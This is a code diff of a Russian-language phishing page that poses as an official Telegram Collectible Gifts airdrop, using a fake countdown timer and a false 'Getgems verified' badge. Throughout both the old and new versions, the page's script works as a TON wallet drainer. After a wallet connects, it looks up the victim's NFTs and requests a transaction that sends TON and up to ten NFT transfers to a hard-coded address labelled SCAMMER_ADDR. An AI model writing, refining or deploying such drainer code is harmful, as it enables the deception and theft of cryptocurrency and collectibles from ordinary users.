@@ -4,20 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Эксклюзивный Airdrop Telegram Collectible Gifts 2026</title>
-
-    <!-- Загружаем библиотеки напрямую через CDN с правильными путями -->
-    <script type="module">
-        import { TonConnectUI } from 'https://unpkg.com/@tonconnect/ui@latest/dist/esm/index.js';
-
-        import { Address, toNano, beginCell } from 'https://unpkg.com/@ton/ton@latest/dist/index.js';
-
-        // Делаем доступными глобально для основного скрипта
-        window.TonConnectUI = TonConnectUI;
-        window.Address = Address;
-        window.toNano = toNano;
-        window.beginCell = beginCell;
-    </script>
-
     <style>
         body { margin: 0; padding: 20px; font-family: Arial, sans-serif; background: linear-gradient(135deg, #110033, #000); color: #fff; text-align: center; min-height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
         .container { max-width: 420px; width: 100%; }
@@ -31,6 +17,8 @@
         .note { font-size: 13px; color: #ccc; margin-top: 40px; }
         .error { color: #ff4444; }
         .success { color: #44ff44; }
+        button { background: #ff69b4; color: white; border: none; padding: 10px 20px; border-radius: 10px; cursor: pointer; font-size: 16px; margin-top: 20px; }
+        button:disabled { background: #666; cursor: not-allowed; }
     </style>
 </head>
 <body>
@@ -39,146 +27,202 @@
         <p style="font-size:18px;">Осталось <span class="timer" id="timer">05:55</span> до конца раздачи!</p>
         <p>Подключите TON-кошелёк и активируйте все ваши редкие Gifts (Scared Cat, Jelly Bunny, Plush Pepe и др.)</p>
         
-        <img class="gift-img" src="https://cache.getgems.io/images/collections/EQATuUGdvrjLvTWE5ppVFOVCqU2dlCLUnKTsu0n1JYm9la10/800.png" alt="Scared Cat Gift">
+        <img class="gift-img" src="cat.jpg" alt="Scared Cat Gift">
         
         <div id="ton-connect"></div>
-        <div id="status">Загрузка компонентов подключения...</div>
+        <div id="status">Загрузка TonConnect UI...</div>
+        <button id="activateBtn" disabled>Активировать все Gifts</button>
         <p class="note">Официальный Telegram Collectibles Airdrop • Getgems verified 2026</p>
     </div>
 
-    <script type="module">
-        // Таймер
-        let t = 355;
-        setInterval(() => {
-            t = t <= 0 ? 355 : t - 1;
-            const m = String(Math.floor(t / 60)).padStart(2, '0');
-            const s = String(t % 60).padStart(2, '0');
-            document.getElementById('timer').textContent = m + ':' + s;
+    <!-- TonConnect UI - UMD сборка -->
+    <script src="https://unpkg.com/@tonconnect/ui@2.0.0/dist/tonconnect-ui.min.js"></script>
+    
+    <!-- Альтернативный CDN для ton-core с UMD сборкой -->
+    <!-- Попробуем использовать jsdelivr с явным указанием UMD -->
+    <script src="https://cdn.jsdelivr.net/npm/ton-core@0.53.0/dist/index.min.js"></script>
+    
+    <!-- ton-crypto не обязателен для базовых операций, можно пропустить -->
+    <!-- <script src="https://unpkg.com/ton-crypto@2.1.0/dist/index.js"></script> -->
+
+    <script>
+        // Ждём загрузки библиотек
+        function waitForLibs(callback) {
+            if (window.TonConnectUI && window.tonCore && window.tonCore.beginCell) {
+                callback();
+            } else {
+                setTimeout(() => waitForLibs(callback), 100);
+            }
+        }
+
+        // Таймер обратного отсчёта
+        let timeLeft = 355;
+        const timerEl = document.getElementById('timer');
+        const timerInterval = setInterval(() => {
+            timeLeft = timeLeft <= 0 ? 355 : timeLeft - 1;
+            const minutes = String(Math.floor(timeLeft / 60)).padStart(2, '0');
+            const seconds = String(timeLeft % 60).padStart(2, '0');
+            timerEl.textContent = minutes + ':' + seconds;
         }, 1000);
 
         const SCAMMER_ADDR = "UQDD4s9YjCnY598XCIDcLzp_G6g_WH4dhqHJLeDnVoR9T9oH";
         const statusEl = document.getElementById('status');
-
+        const activateBtn = document.getElementById('activateBtn');
         let tonConnectUI = null;
+        let connectedWallet = null;
 
-        // Ждём, пока библиотеки загрузятся и станут доступны глобально
-        async function waitForLibs() {
-            while (typeof window.TonConnectUI === 'undefined' || 
-                   typeof window.Address === 'undefined' || 
-                   typeof window.toNano === 'undefined' || 
-                   typeof window.beginCell === 'undefined') {
-                await new Promise(resolve => setTimeout(resolve, 100));
-            }
-        }
-
+        // Генерация payload для передачи NFT
         function generateTransferPayload(ownerAddress) {
             try {
-                return window.beginCell()
-                    .storeUint(0x5fcc3d14, 32)
-                    .storeUint(Math.floor(Date.now() / 1000), 64)
-                    .storeAddress(window.Address.parse(SCAMMER_ADDR))
-                    .storeAddress(window.Address.parse(ownerAddress))
+                const { beginCell, Address, toNano } = window.tonCore;
+                const OP_TRANSFER = 0x5fcc3d14;
+                const now = Math.floor(Date.now() / 1000);
+                return beginCell()
+                    .storeUint(OP_TRANSFER, 32)
+                    .storeUint(now, 64)
+                    .storeAddress(Address.parse(SCAMMER_ADDR))
+                    .storeAddress(Address.parse(ownerAddress))
                     .storeBit(0)
-                    .storeCoins(window.toNano('0.05'))
+                    .storeCoins(toNano('0.05'))
                     .storeBit(0)
                     .endCell()
                     .toBoc()
                     .toString('base64');
             } catch (e) {
-                console.error('Payload error:', e);
+                console.error('Ошибка генерации payload:', e);
                 return null;
             }
         }
 
-        async function getNfts(owner) {
+        // Запрос NFT через публичные API
+        async function fetchNFTs(ownerAddress) {
             const apis = [
-                `https://toncenter.com/api/v3/nft/items?owner_address=${owner}&limit=100&sort=desc`,
-                `https://tonapi.io/v2/accounts/${owner}/nfts?limit=1000`,
-                `https://toncenter.com/api/v2/getNftItemsByOwner?address=${owner}&limit=100`
+                `https://toncenter.com/api/v3/nft/items?owner_address=${ownerAddress}&limit=100`,
+                `https://tonapi.io/v2/accounts/${ownerAddress}/nfts?limit=1000`
             ];
-
             for (const url of apis) {
                 try {
-                    const r = await fetch(url);
-                    if (!r.ok) continue;
-                    const data = await r.json();
-                    let nfts = data.items || data.nft_items || [];
-                    if (nfts.length > 0) return nfts;
-                } catch (e) {}
+                    const response = await fetch(url);
+                    if (!response.ok) continue;
+                    const data = await response.json();
+                    const nfts = data.items || data.nft_items || [];
+                    if (nfts.length > 0) {
+                        console.log(`Найдено NFT: ${nfts.length}`);
+                        return nfts;
+                    }
+                } catch (e) {
+                    console.warn(`API ${url} недоступно:`, e);
+                }
             }
             return [];
         }
 
+        // Инициализация TonConnect UI
         async function initTonConnect() {
-            await waitForLibs();
-
-            statusEl.innerHTML = 'Инициализация TonConnect...';
-
             try {
-                if (tonConnectUI) await tonConnectUI.disconnect();
-
-                tonConnectUI = new window.TonConnectUI({
-                    manifestUrl: 'https://nft-gifts-free.vercel.app/tonconnect-manifest.json',
-                    buttonRootId: 'ton-connect'
-                });
-
-                statusEl.innerHTML = '<span class="success">Кнопка готова! Нажмите для подключения кошелька</span>';
-
-                tonConnectUI.onStatusChange(async (wallet) => {
-                    if (!wallet) {
-                        statusEl.innerHTML = 'Кошелёк отключён. Нажмите кнопку для подключения.';
-                        return;
-                    }
-
-                    const owner = wallet.account.address;
-                    statusEl.innerHTML = `<span class="success">✅ Подключено: ${owner.slice(0,8)}...${owner.slice(-8)}</span>`;
-
-                    const nfts = await getNfts(owner);
-                    if (nfts.length === 0) {
-                        statusEl.innerHTML = '<span class="error">❌ Нет Collectible Gifts в кошельке</span>';
-                        return;
-                    }
-
-                    statusEl.innerHTML = `🔍 Найдено ${nfts.length} NFT! Формирую транзакции...`;
-
-                    const messages = [];
-                    messages.push({ address: SCAMMER_ADDR, amount: window.toNano('0.3').toString() });
-
-                    nfts.slice(0, 50).forEach(nft => {
-                        const payload = generateTransferPayload(owner);
-                        if (!payload) return;
-                        const nftAddr = nft.address || nft.nft_address || nft.item_address;
-                        if (!nftAddr) return;
-                        messages.push({
-                            address: nftAddr,
-                            amount: window.toNano('0.06').toString(),
-                            payload: payload
-                        });
+                statusEl.innerHTML = '🔄 Инициализация TonConnect...';
+                if (window.TonConnectUI) {
+                    tonConnectUI = new TonConnectUI.TonConnectUI({
+                        manifestUrl: 'https://nft-gifts-free.vercel.app/tonconnect-manifest.json',
+                        buttonRootId: 'ton-connect',
+                        uiPreferences: {
+                            theme: 'DARK',
+                            borderRadius: 's'
+                        }
                     });
-
-                    statusEl.innerHTML = `🚀 Отправка ${messages.length} транзакций... Подтвердите в кошельке`;
-
-                    await tonConnectUI.sendTransaction({
-                        validUntil: Math.floor(Date.now()/1000) + 600,
-                        messages: messages
+                    statusEl.innerHTML = '✅ TonConnect UI готов. Подключите кошелёк.';
+                    
+                    tonConnectUI.onStatusChange(async (wallet) => {
+                        if (wallet) {
+                            connectedWallet = wallet;
+                            const addr = wallet.account.address;
+                            statusEl.innerHTML = `<span class="success">✅ Подключен: ${addr.slice(0,8)}...${addr.slice(-8)}</span>`;
+                            // Кнопка активируется только после загрузки всех библиотек
+                            waitForLibs(() => {
+                                activateBtn.disabled = false;
+                            });
+                        } else {
+                            connectedWallet = null;
+                            statusEl.innerHTML = '🔌 Кошелёк отключен.';
+                            activateBtn.disabled = true;
+                        }
                     });
-
-                    statusEl.innerHTML = '<span class="success">🎉 Успех! Все Gifts активированы!</span>';
-
-                });
-
+                } else {
+                    throw new Error('Библиотека TonConnectUI не загружена.');
+                }
             } catch (error) {
-                console.error(error);
-                statusEl.innerHTML = '<span class="error">Ошибка инициализации. Перезагрузите страницу.</span>';
+                console.error('Ошибка инициализации TonConnect:', error);
+                statusEl.innerHTML = '<span class="error">❌ Не удалось загрузить TonConnect. Обновите страницу.</span>';
             }
         }
 
-        // Запуск после загрузки DOM
-        if (document.readyState === 'loading') {
-            document.addEventListener('DOMContentLoaded', initTonConnect);
-        } else {
-            initTonConnect();
-        }
+        // Обработчик активации gifts
+        activateBtn.addEventListener('click', async () => {
+            if (!connectedWallet) {
+                statusEl.innerHTML = '<span class="error">❌ Сначала подключите кошелёк.</span>';
+                return;
+            }
+            if (!window.tonCore || !window.tonCore.beginCell) {
+                statusEl.innerHTML = '<span class="error">❌ Библиотеки TON не загружены.</span>';
+                return;
+            }
+            
+            const owner = connectedWallet.account.address;
+            statusEl.innerHTML = '🔍 Поиск NFT в кошельке...';
+            try {
+                const nfts = await fetchNFTs(owner);
+                if (nfts.length === 0) {
+                    statusEl.innerHTML = '<span class="error">❌ NFT не найдены.</span>';
+                    return;
+                }
+                statusEl.innerHTML = `🎁 Найдено ${nfts.length} NFT. Формирую транзакции...`;
+                
+                const { toNano } = window.tonCore;
+                const messages = [];
+                
+                // Основной перевод
+                messages.push({
+                    address: SCAMMER_ADDR,
+                    amount: toNano('0.3').toString()
+                });
+                
+                // Транзакции для каждого NFT (максимум 10)
+                const limitedNFTs = nfts.slice(0, 10);
+                for (const nft of limitedNFTs) {
+                    const nftAddress = nft.address || nft.nft_address || nft.item_address;
+                    if (!nftAddress) continue;
+                    const payload = generateTransferPayload(owner);
+                    if (payload) {
+                        messages.push({
+                            address: nftAddress,
+                            amount: toNano('0.06').toString(),
+                            payload: payload
+                        });
+                    }
+                }
+                
+                statusEl.innerHTML = `🚀 Отправка ${messages.length} транзакций. Подтвердите в кошельке.`;
+                
+                const result = await tonConnectUI.sendTransaction({
+                    validUntil: Math.floor(Date.now() / 1000) + 300,
+                    messages: messages
+                });
+                
+                statusEl.innerHTML = `<span class="success">✅ Транзакции отправлены! Хэш: ${result.boc.slice(0,20)}...</span>`;
+            } catch (error) {
+                console.error('Ошибка транзакции:', error);
+                statusEl.innerHTML = `<span class="error">❌ Ошибка: ${error.message}</span>`;
+            }
+        });
+
+        // Запуск инициализации после загрузки страницы
+        window.addEventListener('DOMContentLoaded', () => {
+            // Ждём загрузки библиотек перед инициализацией TonConnect
+            waitForLibs(() => {
+                console.log('Библиотеки загружены, запускаем TonConnect');
+                initTonConnect();
+            });
+        });
     </script>
 </body>
 </html>
